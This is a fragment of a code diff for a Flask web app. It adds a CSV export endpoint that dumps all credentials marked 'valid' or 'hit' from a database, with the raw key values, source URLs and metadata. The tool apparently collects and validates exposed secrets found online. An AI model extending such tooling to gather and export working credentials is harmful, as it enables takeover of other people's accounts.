+        c.execute("""SELECT COUNT(*) FROM credentials
+                       WHERE status IN ('valid','hit')
+                         AND type NOT IN ('Crypto','Mnemonic')""")
+        total = c.fetchone()[0]
+        conn.close()
+        return jsonify({'ok': True, 'findings': rows, 'total': total,
+                        'offset': offset, 'limit': limit})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/export/hits.csv', methods=['GET'])
+def api_export_hits_csv():
+    """Download all hits as CSV (no row cap). Optional ?status= and ?type= filters."""
+    import csv, io as _io
+    status_filter = request.args.get('status', '')   # 'valid', 'hit', or '' for both
+    type_filter   = request.args.get('type',   '')   # credential type, or '' for all
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        where = "WHERE status IN ('valid','hit') AND type NOT IN ('Crypto','Mnemonic')"
+        params: list = []
+        if status_filter in ('valid', 'hit'):
+            where += ' AND status = ?'
+            params.append(status_filter)
+        if type_filter:
+            where += ' AND type = ?'
+            params.append(type_filter)
+        c.execute(f'''SELECT type, key_value, source_url, timestamp, metadata, status, id
+                      FROM credentials {where} ORDER BY id DESC''', params)
         rows = c.fetchall()
         conn.close()
-        return jsonify({'ok': True, 'findings': rows})
+        buf = _io.StringIO()
+        w = csv.writer(buf)
+        w.writerow(['provider', 'credential', 'source_url', 'discovered_at', 'metadata', 'status', 'id'])
+        w.writerows(rows)
+        csv_bytes = buf.getvalue().encode('utf-8')
+        resp = make_response(csv_bytes)
+        resp.headers['Content-Type'] = 'text/csv; charset=utf-8'
+        resp.headers['Content-Disposition'] = f'attachment; filename="hits-{len(rows)}.csv"'
+        return resp
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
